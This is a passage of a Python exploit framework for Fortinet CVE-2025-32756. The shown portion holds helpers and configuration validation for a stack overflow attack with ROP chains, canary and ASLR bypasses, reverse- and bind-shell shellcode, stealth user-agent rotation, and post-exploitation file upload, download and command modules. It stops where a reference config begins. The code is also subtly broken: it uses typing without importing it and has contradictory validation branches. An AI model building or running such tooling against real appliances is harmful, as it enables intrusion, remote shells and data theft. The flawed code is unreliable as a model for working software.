#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Fortinet CVE-2025-32756 Reproducible PoC Framework
# Designed for Demonstration of Deep Exploitation
# Core Python modules
import sys

# Add Python version check early
if sys.version_info < (3, 10):
    # Use standard print to ensure this message gets through before logging/pwntools
    print("[-] Python 3.10 or higher is required for type hinting syntax and features.", file=sys.stderr)
    sys.exit(1)

import time  # Used for delays
import socket  # Used for shell/verify handlers
import json  # json is used

# Consider json5 or commentjson for more flexible config parsing if comments in strings are required.
# import json5 # Use if you prefer json5 for config parsing

import argparse  # argparse is used
import re  # Used for regex parsing in leak info
# import os # os.urandom replaced by secrets
import random # Used for random user agent selection
import secrets # Using secrets for production-grade randomness

# Re-add traceback for error logging
import traceback
import logging # Use standard logging

# Explicitly import requests
import requests # Used when trigger logic is implemented
# Suppress InsecureRequestWarning
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
# Import packaging.version unconditionally for version comparison
try:
    from packaging.version import Version
except ImportError:
    # Use standard print to ensure this message gets through before logging is configured
    print("[-] Error importing 'packaging'. Please install it: python3 -m pip install packaging", file=sys.stderr)
    sys.exit(1)
# Import pwntools (requires pinning)
try:
    import pwn
    # Version check for pwntools
    if Version(pwn.__version__) < Version('4.12'):
        # Use standard print to ensure this message gets through
        print(
            "[-] pwntools version is too old (requires >= 4.12). Please upgrade: python3 -m pip install --upgrade pwntools>=4.12",
             file=sys.stderr
        )
        print(
            "    Recommended installation: python3 -m pip install --upgrade 'pwntools>=4.12' packaging requests>=2.32.2,<4.0", # Bump requests pin
            file=sys.stderr
        )
        sys.exit(1)
    # Import specifically needed functions instead of '*' for clarity
    # pwn.log is a standard logger now, handled by global logging config
    pwntools_context = pwn.context # Use alias consistently
    # pwntools_ROP = pwn.ROP # Not needed if manually building ROP bytes
    pwntools_asm = pwn.asm
    pwntools_shellcraft = pwn.shellcraft
    pwntools_p32 = pwn.p32
    pwntools_p64 = pwn.p64
    pwntools_interactive = pwn.util.interactive.interactive
    pwntools_remote = pwn.remote # Used for shell/post-exploitation
    # Import encoders directly from pwnlib
    # from pwnlib.encoders import encode as pwnt_enc_encode # Commented out until used

except ImportError:
    # Use standard print to ensure this message gets through
    print(
        "[-] Error importing 'pwntools'. Please install it: python3 -m pip install pwntools>=4.12",
         file=sys.stderr
    )
    print(
        "    Also ensure you have necessary dependencies likely needed for shellcode or ROP, like 'capstone' and 'ROPgadget' if using advanced features.",
         file=sys.stderr
    )
    print(
        "    Recommended installation: python3 -m pip install --upgrade 'pwntools>=4.12' packaging requests>=2.32.2,<4.0", # Bump requests pin
        file=sys.stderr
    )
    sys.exit(1)
except Exception as e:
    # Use standard print to ensure this message gets through
    print(f"[-] An unexpected error occurred while importing pwntools: {e}", file=sys.stderr)
    print("    Ensure all pwntools dependencies are installed.", file=sys.stderr)
    traceback.print_exc(file=sys.stderr) # Keep traceback for unexpected import errors
    sys.exit(1)
# Import typing explicitly (using Union[dict, None] requires Python 3.10+)
# On older Python versions, use `from typing import Optional` and `Optional[dict]`


# Add requirements.txt content (for documentation) - Keep it clean and accurate
REQUIREMENTS_CONTENT = """
pwntools>=4.12
requests>=2.32.2,<4.0 # Pin requests version < 4.0 due to potential API changes, >= 2.32.2 for verify=False
packaging>=21.0
secrets # builtin
# json5 # recommended for production config parsing
""".strip()  # Strip leading/trailing whitespace


# Define a custom logging level for success messages
SUCCESS_LVL = 25  # between INFO (20) and WARNING (30)
logging.addLevelName(SUCCESS_LVL, "SUCCESS")

# Define a method to add a 'success' level to Logger instances
# Add *args, **kwargs to success method signature
def success(self, msg, *args, **kwargs):
    if self.isEnabledFor(SUCCESS_LVL):
        self._log(SUCCESS_LVL, msg, args, **kwargs)

# Attach the success method to the Logger class
logging.Logger.success = success

# Configure the main logger
logger = logging.getLogger(__name__)
# Log level is set later based on CLI args in main()
# logging.basicConfig here would clobber user settings. Moved to main().


# --- Custom Exception ---
class ExploitError(Exception):
    """Custom exception for signaling exploit failures."""
    pass

# --- Configuration Loading ---
DEFAULT_CONFIG_FILE = (
    'forti_exploit_config_reference_706.json'  # Point to reference config
)
# Define allowed payload_locations as a module-level constant
ALLOWED_PAYLOAD_LOCATIONS = ['cookie_hex', 'post_param_hex', 'get_param_hex', 'body_raw_bytes', 'body_raw_text']

# Define allowed HTTP methods as a module-level constant
ALLOWED_HTTP_METHODS = {"GET", "POST", "PUT", "PATCH", "DELETE"}

# --- Utility Functions ---
# Pre-compute replacement table once at module scope
# This regex is still basic and doesn't handle quoted strings or complex JSON structure correctly.
# For production use, consider a JSON5 parser or a more robust state machine (e.g., json5 library).
# For now, continue using the regex but clarify its limitations.
_COMMENT_RE = re.compile(
    r'/\*([^*]|\*(?!/))*?\*/|//.*?(?:\n|$)|#.*?(?:\n|$)', # block, // line, # line comments
    re.S # . matches newlines
)
# Sentinel to protect '://' if comment regex is used (basic approach)
# More robust solution needed for complex JSON/comments interactions.
_SCHEME_SENTINEL = "__SCHEME_DELIMITER__"


_MANGLE_REPLACEMENT_TABLE = str.maketrans({
    '/': '_slash_',
    '.': '_dot_',
    '-': '_dash_',
    ' ': '_space_',
    '(':'_lparen_',
    ')':'_rparen_',
})
SENTINEL_PREFIX = "_mngld_"  # Define sentinel prefix
def _mangle_name(name: typing.Union[str, int]) -> str:
    """Sanitizes a string or number to be a valid dictionary key or attribute name."""
    if isinstance(name, int):
        return str(name)  # Return numbers as strings directly
    if not isinstance(name, str):  # Should not happen with correct type hints but safe guard
        return str(name)
    # Check for existing mangling prefix directly
    # Use the defined SENTINEL_PREFIX
    if name.startswith(SENTINEL_PREFIX):
        return name  # Assume already mangled by this function
    # Apply replacement and add the sentinel prefix
    mangled = name.translate(_MANGLE_REPLACEMENT_TABLE)
    # Add the sentinel prefix
    return SENTINEL_PREFIX + mangled

def _addr_key(module, symbol):
    """Helper to build consistent address keys for the all_addresses/all_gadgets dicts."""
    return f"{_mangle_name(module)}_{_mangle_name(symbol)}"

def pack_addr(addr: int, size: int, le: bool = True) -> bytes:
    """Packs an address (integer) to bytes based on size (4 or 8) and endianness."""
    if not isinstance(addr, int):
        raise TypeError("Address must be an integer")
    if size == 8:
        # Corrected keywords and logic for pwntools p64
        return pwntools_p64(addr, endian='little') if le else pwntools_p64(addr, endian='big')
    elif size == 4:
        # Corrected keywords and logic for pwntools p32
        return pwntools_p32(addr, endian='little') if le else pwntools_p32(addr, endian='big')
    else:
        raise ValueError(f"Unsupported address size: {size}")

# New packer that uses instance's pointer_size
# Docstring corrected to match signature
def pack_addr_auto(self, addr: int, le: bool = True) -> bytes:
    """Packs an address (integer) to bytes based on instance's pointer_size and endianness."""
    # Use pack_addr here and catch its ValueError, convert to ExploitError
    try:
        return pack_addr(addr, self.pointer_size, le)
    except ValueError as e:
        raise ExploitError(f"[pack_addr_auto] Address packing error: {e}") from e


# Using secrets module for production-grade randomness
def generate_safe_random_padding(n: int, bad_bytes: typing.Set[int]) -> bytes:
    """Generates n secrets random bytes excluding those in bad_bytes."""
    if n <= 0:
        return b'\xff' # Return ff bytes if n <= 0 (padding with safe bytes)
    if not bad_bytes:
        return secrets.token_bytes(n)

    # Check if it's impossible to generate safe padding
    if len(bad_bytes) == 256:
         raise ExploitError("All byte values are forbidden â€“ cannot generate safe padding.")

    padding = bytearray()

    # Generate padding in blocks and filter
    # Limit the number of total attempts to prevent infinite loops in extreme cases
    max_bytes_to_generate = n * 100 # Generate up to 100 times the needed bytes to find enough safe ones.
    generated_bytes_count = 0

    block_size = min(n, 1024) # Generate in blocks of up to 1024 bytes at a time

    # Use secrets.token_bytes for efficient block generation
    while len(padding) < n and generated_bytes_count < max_bytes_to_generate:
        remaining_needed = n - len(padding)
        # Generate a block of random bytes
        current_block_raw = secrets.token_bytes(block_size)
        generated_bytes_count += len(current_block_raw)

        # Filter out bad bytes from the generated block
        filtered_block = bytes(b for b in current_block_raw if b not in bad_bytes)

        # Append safe bytes, taking only what's needed
        to_add = min(len(filtered_block), remaining_needed)
        padding.extend(filtered_block[:to_add])

        # If no bytes were added in this block, retry more forcefully by increasing block size temporarily?
        # For now, rely on the max_bytes_to_generate limit to prevent infinite loops.
        # A more robust approach might dynamically adjust block size or retry strategy.


    if len(padding) < n:
         # This indicates padding generation failed within the max attempts, potentially due to extremely restrictive bad_bytes
         raise ExploitError(f"Failed to generate {n} safe random padding bytes within {max_bytes_to_generate} attempted bytes. Generated {len(padding)} bytes.")

    # Padding length should be exactly n if generation was successful
    return bytes(padding)


def load_config(filepath: str) -> dict | None:
    """Loads and validates configuration from a JSON file."""
    try:
        with open(filepath, 'r', encoding='utf-8') as f:  # Specify encoding
            content = f.read()
            # Robustly remove block, line, and '#' comments before parsing
            # This regex is still basic and doesn't handle quoted strings or complex JSON structure correctly.
            # Use json5 or commentjson for more reliable parsing if comments/non-standard JSON are needed.
            # If sticking to json.loads + regex, add protection for known patterns like "://".
            # Example crude protection for "://":
            content = content.replace("://", _SCHEME_SENTINEL) # Replace "://" with a sentinel

            clean_content = re.sub(
                _COMMENT_RE, '', content # Use the compiled regex pattern
            )  # Remove comments

            clean_content = clean_content.replace(_SCHEME_SENTINEL, "://") # Restore sentinel after comments are stripped

            # Use json.loads for strict JSON parsing after stripping comments
            # Note: This will still fail if comments are inside quoted strings using only this regex stripper
            config = json.loads(clean_content)
        logger.info(f"Configuration loaded successfully from '{filepath}'.")
        # --- Expanded and Corrected Validation ---
        validation_errors = []  # Collect errors
        # Ensure required keys at top level
        required_top_keys = [
            'target',
            'stack_layout',
            'mitigations',
            'rop',
            'payload',
            'addresses',
            'verification',
            'stealth',
            'timing',
            'triggering',
            'post_exploitation',
        ]
        for key in required_top_keys:
            if key not in config:
                validation_errors.append(f"Missing required top-level key '{key}'.")
        # Validate 'target'
        if not isinstance(config.get('target'), dict) or not all(
            k in config['target']
            for k in [
                'ip',
                'port',
                'use_https',
                'vulnerable_path',
                'architecture',
                'endianness',
            ]
        ):
            validation_errors.append("Invalid or incomplete 'target' configuration.")
        else:  # Only validate nested if target is valid
            if config['target'].get('ip') == "0.0.0.0":
                validation_errors.append("'target.ip' cannot be 0.0.0.0.")
            if config['target'].get('port') in [0, None]:
                validation_errors.append("'target.port' cannot be 0 or null.")
            if config['target'].get('architecture') not in [
                'amd64',
                'x86',
                'arm',
                'aarch64',
            ]:
                validation_errors.append(
                    f"Unsupported target architecture: {config['target'].get('architecture')}. Must be one of ['amd64', 'x86', 'arm', 'aarch64']."
                )
            if config['target'].get('endianness') not in ['little', 'big']:
                validation_errors.append(
                    f"Unsupported target endianness: {config['target'].get('endianness')}. Must be 'little' or 'big'."
                )
        # Validate 'stack_layout'
        if not isinstance(config.get('stack_layout'), dict) or not all(
            k in config['stack_layout']
            for k in [
                'buffer_offset',
                'buffer_size',
                'return_address_overwrite_offset',
                'canary_offset', # Include canary and rbp in required keys for layout math
                'saved_rbp_offset'
            ]
        ):
            validation_errors.append("Invalid or incomplete 'stack_layout' configuration.")
        else:
            buf_off = config['stack_layout'].get('buffer_offset', 0)
            buf_size = config['stack_layout'].get('buffer_size', 0)
            ret_off = config['stack_layout'].get('return_address_overwrite_offset', 0)
            canary_off = config['stack_layout'].get('canary_offset', 0)
            rbp_off = config['stack_layout'].get('saved_rbp_offset', 0)
            # Check safety only if values are defined and non-negative

            # Estimate local canary size the same way craft_exploit_payload does *for validation check*
            canary_size_local_est = rbp_off - canary_off if canary_off > 0 and rbp_off > canary_off else (pwntools_context.bits // 8 if canary_off > 0 else 0)

            # Calculate estimated overwrite block size for validation check
            overwrite_block_size_layout = (canary_size_local_est if canary_off > 0 else 0) + (pwntools_context.bits // 8 if rbp_off > 0 else 0) + (pwntools_context.bits // 8)

            # Check for potential negative padding before overwrite block based on estimate
            # Add this check back to validation to catch layout errors early
            estimated_padding_before_overwrite_block = (ret_off - overwrite_block_size_layout) - (buf_off + buf_size)

            # ret_off must be after the end of the Buffer + initial buffer offset
            if ret_off <= buf_off + buf_size: # Corrected inequality to > to match intended logic (already done, keeping the logic here)
                 validation_errors.append(
                    f"Validation Error: RETURN_ADDRESS_OVERWRITE_OFFSET ({ret_off}) must be AFTER (>) Buffer_Offset ({buf_off}) + Buffer_Size ({buf_size}). Check your stack layout."
                )
            # Add check for canary vs bypass setting based on canary_offset
            if canary_off > 0 and not config['mitigations'].get('canary', {}).get('use', False):
                 validation_errors.append(
                     f"Validation Error: Stack layout has a canary_offset ({canary_off}), but 'mitigations.canary.use' is false. The canary will be smashed unless bypassed."
                 )
                 # Also check if a leak method is actually configured if bypass is true and offset > 0
            elif canary_off > 0 and config['mitigations'].get('canary', {}).get('use', False) and config['mitigations'].get('canary', {}).get('method') == 'leak' and not config['mitigations'].get('canary', {}).get('leak_config'):
                  validation_errors.append(
                      f"Validation Error: Stack layout has a canary_offset ({canary_off}) and 'mitigations.canary.use' is true, but the 'method' is 'leak' and 'leak_config' is missing. Leak configuration is required to bypass the canary."
                  )

            # Check if estimated negative padding based on layout is possible.
            # This helps catch fundamentally impossible layouts early.
            if estimated_padding_before_overwrite_block < 0:
                 validation_errors.append(
                     f"Validation Error: Estimated padding before overwrite block is negative ({estimated_padding_before_overwrite_block}). "
                     "This indicates the return address overwrite offset, stack layout offsets, and pointer size are inconsistent."
                 )


            if canary_off > 0 and (canary_off < buf_off + buf_size or canary_off >= ret_off):
                logger.warning(
                    f"Validation Warning: Canary offset ({canary_off}) not between buffer end ({buf_off + buf_size}) and return address ({ret_off}). Check stack layout."
                )
            if rbp_off > 0 and (rbp_off < buf_off + buf_size or rbp_off >= ret_off):
                logger.warning(
                    f"Validation Warning: Saved RBP offset ({rbp_off}) not between buffer end ({buf_off + buf_size}) and return address ({ret_off}). Check stack layout."
                )
            if canary_off > 0 and rbp_off > 0 and canary_off >= rbp_off:
                logger.warning(
                    f"Validation Warning: Canary offset ({canary_off}) >= Saved RBP offset ({rbp_off}). Common layout is Canary then RBP."
                )
        # Validate 'mitigations'
        if not isinstance(config.get('mitigations'), dict) or not all(
            k in config['mitigations'] for k in ['aslr', 'canary', 'dep_nx']
        ):
            validation_errors.append("Invalid or incomplete 'mitigations' configuration.")
        else:
            # Corrected the typo "mitigation" to "mitigations"
            if not isinstance(config['mitigations'].get('aslr'), dict) or config['mitigations']['aslr'].get('use') is None or config['mitigations']['aslr'].get('method') is None:
                validation_errors.append("Invalid or incomplete 'mitigations.aslr' configuration.")
            if (
                config['mitigations'].get('aslr', {}).get('use', False) # Corrected path
                and config['mitigations'].get('aslr', {}).get('method') == 'leak' # Corrected path
                and not isinstance(config['mitigations'].get('aslr', {}).get('leak_config', {}), dict) # Corrected path
            ):
                validation_errors.append("'mitigations.aslr.method' is 'leak' but 'leak_config' is missing or invalid.")
            # Add check for ASLR bypass method 'none' when ASLR use is true
            if config['mitigations'].get('aslr', {}).get('use', False) and config['mitigations'].get('aslr', {}).get('method') == 'none':
                 validation_errors.append(
                     "Validation Error: 'mitigations.aslr.use' is true, but 'mitigations.aslr.method' is 'none'. This configuration is contradictory; ASLR bypass method is required if ASLR is in use."
                 )
            # Also check if a leak method is actually configured if bypass is true and leak is the method
            elif config['mitigations'].get('aslr', {}).get('use', False) and config['mitigations'].get('aslr', {}).get('method') == 'leak' and not config['mitigations'].get('aslr', {}).get('leak_config'):
                 validation_errors.append(
                     "Validation Error: 'mitigations.aslr.use' is true and 'method' is 'leak', but 'leak_config' is missing. Leak configuration is required."
                 )


            if not isinstance(config['mitigations'].get('canary'), dict) or config['mitigations']['canary'].get('use') is None or config['mitigations']['canary'].get('method') is None: # Typo here too config['mitigation']
                 # Corrected path:
                if not isinstance(config['mitigations'].get('canary'), dict) or config['mitigations']['canary'].get('use') is None or config['mitigations']['canary'].get('method') is None:
                    validation_errors.append("Invalid or incomplete 'mitigations.canary' configuration.")

            if (
                config['mitigations'].get('canary', {}).get('use', False)
                and config['mitigations'].get('canary', {}).get('method') == 'leak'
                and not isinstance(config['mitigations'].get('canary', {}).get('leak_config', {}), dict)
            ):
                validation_errors.append("'mitigations.canary.method' is 'leak' but 'leak_config' is missing or invalid.")
            # Add check for Canary bypass method 'none' when Canary use is true
            if config['mitigations'].get('canary', {}).get('use', False) and config['mitigations'].get('canary', {}).get('method') == 'none':
                 validation_errors.append(
                     "Validation Error: 'mitigations.canary.use' is true, but 'mitigations.canary.method' is 'none'. This configuration is contradictory; Canary bypass method is required if Canary is in use."
                 )
            # Also check if a leak method is actually configured if bypass is true and leak is the method
            elif config['mitigations'].get('canary', {}).get('use', False) and config['mitigations'].get('canary', {}).get('method') == 'leak' and not config['mitigations'].get('canary', {}).get('leak_config'):
                 validation_errors.append(
                     "Validation Error: 'mitigations.canary.use' is true and 'method' is 'leak', but 'leak_config' is missing. Leak configuration is required."
                 )


            if not isinstance(config['mitigations'].get('dep_nx'), dict) or config['mitigations']['dep_nx'].get('use') is None or config['mitigations']['dep_nx'].get('method') is None:
                validation_errors.append("Invalid or incomplete 'mitigations.dep_nx' configuration.")
            if (
                config['mitigations'].get('dep_nx', {}).get('use', False)
                and config['mitigations'].get('dep_nx', {}).get('method')
                not in ['rop', 'jmp_rwx', 'mprotect']
            ):
                validation_errors.append(
                    f"Unsupported DEP/NX bypass method '{config['mitigations'].get('dep_nx', {}).get('method')}'. Must be one of ['rop', 'jmp_rwx', or 'mprotect']."
                )
            # Add check for DEP/NX bypass method 'none' when DEP/NX use is true
            if config['mitigations'].get('dep_nx', {}).get('use', False) and config['mitigations'].get('dep_nx', {}).get('method') == 'none':
                 validation_errors.append(
                     "Validation Error: 'mitigations.dep_nx.use' is true, but 'mitigations.dep_nx.method' is 'none'. This configuration is contradictory; DEP/NX bypass method is required if DEP/NX is in use."
                 )

        # Validating 'rop'
        if not isinstance(config.get('rop'), dict):
            validation_errors.append("Invalid or incomplete 'rop' configuration.")
        else:
            if not isinstance(config['rop'].get('gadgets', {}), dict):
                validation_errors.append("Invalid or incomplete 'rop.gadgets' configuration. Must be a dictionary (gadget_name: address/offset).")
            # Check both module_gadget_offsets key and its format if present
            if 'module_gadget_offsets' in config['rop'] and not isinstance(config['rop']['module_gadget_offsets'], dict):
                validation_errors.append("Invalid 'rop.module_gadget_offsets' configuration; must be a dictionary.")
            elif isinstance(config['rop'].get('module_gadget_offsets', {}), dict) and any(
                not isinstance(v, dict) for v in config['rop']['module_gadget_offsets'].values()
            ):
                validation_errors.append(
                    "Invalid format for 'rop.module_gadget_offsets'; values must be dictionaries of gadget names to offsets."
                )
            chain_type = config['rop'].get('chain_type')
            if chain_type not in [
                'system',
                'execve',
                'custom',
                'stack_pivot',
                'mprotect',
            ]:
                # Defaulting is handled at runtime, but log warning during validation
                logger.warning(
                    f"Validation Warning: Unknown ROP chain type '{config['rop'].get('chain_type')}'. Defaulting to 'system'."
                )
                config['rop']['chain_type'] = 'system'  # Also update config object for consistency
            # Validating rop_chain definition based on payload type ('rop') wherever it is located
            if config['payload'].get('type') == 'rop':
                # Check if the rop_chain config exists in EITHER rop or payload section AND is a dictionary
                # Use get from both places
                rop_chain_config = config.get('payload', {}).get('rop_chain')  # Check under 'payload'
                if rop_chain_config is None:
                    # Check under 'rop' if not found in payload
                    rop_chain_config = config.get('rop', {}).get('rop_chain')
                if not isinstance(rop_chain_config, dict) and rop_chain_config is not None:  # Allow None if not defined
                    validation_errors.append(
                        "Missing or invalid 'rop_chain' definition when payload type is 'rop'. "
                        "Must be a dictionary or null and located in either 'rop' or 'payload' section."
                    )
                elif isinstance(rop_chain_config, dict):
                    # Store corrected rop_chain_config into config['payload'] for consistent access
                    config.setdefault('payload', {})['rop_chain'] = (
                        rop_chain_config  # Use setdefault if payload doesn't exist
                    )
                    # Further validation for specific ROP chain types if payload type is rop
                    if chain_type in ['system', 'execve']:
                         if 'command' not in rop_chain_config or not isinstance(rop_chain_config['command'], str):
                             validation_errors.append(f"ROP chain type '{chain_type}' requires a string 'command' in the rop_chain definition.")
                    # Add validation for other ROP chain types if needed
        # Validate 'payload'
        if not isinstance(config.get('payload'), dict) or config['payload'].get('type') not in [
            'shellcode',
            'rop',
        ]:
            validation_errors.append(
                "Invalid or incomplete 'payload' configuration. 'type' must be 'shellcode' or 'rop'."
            )
        else:
            if (
                config['payload'].get('type') == 'shellcode'
                and not isinstance(config['payload'].get('shellcode_options', {}), dict)
            ):
                validation_errors.append(
                    "Invalid or incomplete 'payload.shellcode_options' config when payload type is 'shellcode'."
                )
            shellcode_type = config['payload']['shellcode_options'].get('type')
            if config['payload'].get('type') == 'shellcode' and shellcode_type not in [
                'reverse_shell',
                'bind_shell',
                'exec_command',
            ]:
                validation_errors.append(
                    f"Unsupported shellcode type '{shellcode_type}'. Must be one of ['reverse_shell', 'bind_shell', 'exec_command'].")
            # Add validation for shellcode options based on type
            if shellcode_type in ['reverse_shell', 'bind_shell']:
                 if 'port' not in config['payload']['shellcode_options'] or not isinstance(config['payload']['shellcode_options']['port'], int):
                     validation_errors.append(f"Shellcode type '{shellcode_type}' requires an integer 'port' in shellcode_options.")
                 if shellcode_type == 'reverse_shell' and ('lhost' not in config['payload']['shellcode_options'] or not isinstance(config['payload']['shellcode_options']['lhost'], str)):
                     validation_errors.append(f"Shellcode type '{shellcode_type}' requires a string 'lhost' in shellcode_options.")
            if shellcode_type == 'exec_command':
                 if 'command' not in config['payload']['shellcode_options'] or not isinstance(config['payload']['shellcode_options']['command'], str):
                     validation_errors.append(f"Shellcode type '{shellcode_type}' requires a string 'command' in shellcode_options.")

            if 'bad_chars' in config['payload']:
                if not isinstance(config['payload']['bad_chars'], list) or not all(
                    re.fullmatch(r'[0-9a-fA-F]{2}', c)
                    for c in config['payload']['bad_chars']
                ):
                    validation_errors.append(
                        "'payload.bad_chars' must be a list of 2-character hex strings (e.g., [\"00\", \"0A\"])."
                    )
        # Validating 'addresses'
        if not isinstance(config.get('addresses'), dict):
            logger.warning("Validation Warning: 'addresses' configuration is missing or invalid.")
        else:
            # Check for required fixed addresses based on mitigations/payload if ASLR is off
            if not config['mitigations'].get('aslr', {}).get('use', False):  # ASLR disabled
                if config['addresses'].get('fixed_target_binary_base', 0) == 0:
                    validation_errors.append(
                        "ASLR disabled but 'fixed_target_binary_base' address is 0 in config. Required for non-ASLR exploits."
                    )
                if config['addresses'].get('fixed_input_buffer_base', 0) == 0:
                    validation_errors.append(
                        "ASLR disabled but 'fixed_input_buffer_base' address is 0 in config. Required to calculate exploit code live address."
                    )
                # Check if fixed_libc_base is required and present if ASLR off
                if (
                     config['payload'].get('type') == 'rop'
                     and config['rop'].get('chain_type') in ['system', 'execve']
                ):
                     if config['addresses'].get('fixed_libc_base', 0) == 0:
                          validation_errors.append(
                               f"ROP '{config['rop'].get('chain_type')}' chain requires fixed_libc_base to be non-zero if ASLR is disabled."
                          )

        # Validating 'verification'
        if not isinstance(config.get('verification'), dict) or not isinstance(
            config['verification'].get('methods', []), list
        ):
            validation_errors.append(
                "Invalid or incomplete 'verification' configuration. 'methods' must be a list."
            )
        else:
            for i, method in enumerate(config['verification'].get('methods', [])):
                if not isinstance(method, dict) or 'type' not in method:
                    logger.warning(
                        f"Validation Warning: Verification method at index {i} is invalid or missing 'type'. Skipping."
                    )
                    continue
                method_type = method['type']
                if method_type in ['bind_shell_connect', 'tcp_port_open'] and (
                    'port' not in method or not isinstance(method['port'], int)
                ):
                    validation_errors.append(
                        f"Verification method '{method_type}' requires integer 'port'."
                    )
                elif method_type == 'http_file_check' and (
                    'path' not in method or not isinstance(method['path'], str)
                ):
                    validation_errors.append(
                        f"Verification method '{method_type}' requires string 'path'."
                    )
                elif method_type not in ['bind_shell_connect', 'tcp_port_open', 'http_file_check']:
                    logger.warning(f"Validation Warning: Unsupported verification method type '{method_type}'.")
                # Add validation for verification method options (timeouts are already checked in timing)
        # Validating 'stealth'
        if not isinstance(config.get('stealth'), dict):
            logger.warning("Validation Warning: Missing or invalid 'stealth' configuration.")
        else:  # Validating Nested if stealth is valid
            if 'random_padding' in config['stealth'] and \
               not (isinstance(config['stealth']['random_padding'], int) or
                    config['stealth']['random_padding'] is None):
                validation_errors.append("'stealth.random_padding' must be an int or null.")
            if 'vary_user_agent' in config['stealth'] and not isinstance(
                config['stealth']['vary_user_agent'], bool
            ):
                validation_errors.append("'stealth.vary_user_agent' must be a boolean.")
            # If user_agent_list is present, validate it's a list of strings
            if 'user_agent_list' in config['stealth'] and (
                 not isinstance(config['stealth']['user_agent_list'], list)
                 or not all(isinstance(ua, str) for ua in config['stealth']['user_agent_list'])
            ):
                validation_errors.append("'stealth.user_agent_list' must be a list of strings.")
        # Validating 'timing'
        if not isinstance(config.get('timing'), dict):
            logger.warning("Validation Warning: Missing or invalid 'timing' configuration.")
        else:  # Validating nested if timing is valid
            # Validating timing values are numbers (integers or floats)
            for key, value in config['timing'].items():
                if not isinstance(value, (int, float)) and value is not None:  # Allow None
                    validation_errors.append(f"Timing value '{key}' must be a number or null.")
                # Check if delay values are non-negative
                if key.startswith('delay_') and isinstance(value, (int, float)) and value < 0:
                    validation_errors.append(f"Timing delay value '{key}' cannot be negative.")

        # Validating 'triggering'
        if not isinstance(config.get('triggering'), dict) or not isinstance(
            config['triggering'].get('methods', []), list
        ):
            validation_errors.append(
                "Invalid or incomplete 'triggering' configuration. 'methods' must be a list."
            )
        else:
            if not config['triggering'].get('methods'):
                 validation_errors.append("'triggering.methods' list cannot be empty.")

            for i, method in enumerate(config['triggering'].get('methods', [])):
                if not isinstance(method, dict) or 'type' not in method:
                    logger.warning(
                        f"Validation Warning: Trigger method at index {i} is invalid or missing 'type'. Skipping."
                    )
                    continue
                method_type = method['type']
                if method_type in [
                    'requests_http_cookie',
                    'requests_post_param',
                    'get_param_hex',
                    'body_raw',
                ]:
                    if method_type in ['requests_post_param', 'get_param_hex', 'body_raw'] and (
                        'path' not in method or not isinstance(method['path'], str)
                    ):
                        validation_errors.append(
                            f"Trigger method '{method_type}' requires string 'path'."
                        )
                    if method_type in ['requests_post_param', 'get_param_hex'] and (
                        'param_name' not in method or not isinstance(method['param_name'], str)
                    ):
                        validation_errors.append(
                            f"Trigger method '{method_type}' requires string 'param_name'."
                        )
                    if method_type == 'body_raw' and (
                        'http_method' not in method or not isinstance(method['http_method'], str)
                    ):
                         # Validate HTTP method against allowed list
                         http_method = method['http_method'].upper()
                         if http_method not in ALLOWED_HTTP_METHODS:
                             validation_errors.append(
                                 f"Trigger method '{method_type}' has unsupported 'http_method' value: '{method['http_method']}'. Allowed: {', '.join(ALLOWED_HTTP_METHODS)}."
                             )


                    # Check for 'headers' if present: must be a dict
                    if 'headers' in method and not isinstance(method['headers'], dict):
                        validation_errors.append(
                            f"Trigger method '{method_type}' has invalid 'headers' configuration; must be a dictionary."
                        )
                    # Validate payload_location for methods that use it
                    if method_type in ['requests_http_cookie', 'requests_post_param', 'get_param_hex', 'body_raw'] and 'payload_location' in method and method['payload_location'] not in ALLOWED_PAYLOAD_LOCATIONS:
                         validation_errors.append(
                             f"Trigger method '{method_type}' has unsupported 'payload_location' value: '{method['payload_location']}'. Allowed: {', '.join(ALLOWED_PAYLOAD_LOCATIONS)}."
                         )
                elif method_type not in ['requests_http_cookie']:
                    logger.warning(f"Validation Warning: Unsupported trigger method type '{method_type}'.")
        # Validating 'post_exploitation'
        if not isinstance(config.get('post_exploitation'), dict) or not isinstance(
            config['post_exploitation'].get('modules', []), list
        ):
            validation_errors.append(
                "Validation Warning: Missing or invalid 'post_exploitation' configuration or 'modules' list."
            )
        else:
            for i, module in enumerate(config['post_exploitation'].get('modules', [])):
                if not isinstance(module, dict) or 'type' not in module:
                    logger.warning(
                        f"Validation Warning: Post-exploitation module at index {i} is invalid or missing 'type'. Skipping."
                    )
                    continue
                module_type = module['type']
                if module_type == 'execute_command' and (
                    'command' not in module or not isinstance(module['command'], str)
                ):
                    validation_errors.append(
                        "Post-exploitation module 'execute_command' requires string 'command'."
                    )
                elif module_type == 'upload_file' and not all(
                    k in module and isinstance(module[k], str) for k in ['local_path', 'remote_path']
                ):
                    validation_errors.append(
                        "Post-exploitation module 'upload_file' requires string 'local_path' and 'remote_path'."
                    )
                elif module_type == 'download_file' and not all(
                    k in module and isinstance(module[k], str) for k in ['local_path', 'remote_path']
                ):
                    validation_errors.append(
                        "Post-exploitation module 'download_file' requires string 'local_path' and 'remote_path'."
                    )
                # Add other supported module types validation
        if validation_errors:
            logger.critical("Configuration validation failed with the following errors:")
            for error in validation_errors:
                logger.critical(error)
            return None  # Return None if validation failed
        logger.info("Configuration validation passed.")
        return config
    except FileNotFoundError:
        # More helpful error message for missing config file
        logger.critical(f"Configuration error: File not found at '{filepath}'.")
        logger.info(
            f"Ensure '{filepath}' exists and is a valid JSON configuration. A reference config is provided as '{DEFAULT_CONFIG_FILE}'."
        )
        sys.exit(1)
    except json.JSONDecodeError as e:
        # More helpful error message for JSON parsing errors
        # Note: This will occur if comments like // are inside strings using the current regex stripper
        logger.critical(
            f"Configuration error: Failed to decode JSON from '{filepath}'. Check for syntax errors and ensure it is pure JSON (no // or /* */ outside of strings)."
        )
        logger.critical(f"JSON Error: {e}")
        sys.exit(1)
    except Exception as e:
        # Catch any other unexpected exceptions during config loading
        logger.critical(
            f"An unexpected error occurred during configuration loading: {e}", exc_info=True
        )
        sys.exit(1)

# Reference FortiVoice-VM 7.0.6 build 0411 Config (Minimal Viable, No ASLR, No Canary, System ROP)
# THIS IS A REPRODUCER CONFIG - OFFSETS AND ADDRESSES ARE HYPOTHETICAL AND NEED REVERSE ENGINEERING
# THIS CONFIG IS FOR TESTING THE FRAMEWORK STUBS - DO NOT ASSUME OFFSETS/ADDRESSES ARE CORRECT
# Standard JSON format is preferred to avoid issues with comment stripping in strings.
REPRODUCER_CONFIG_CONTENT = """
{
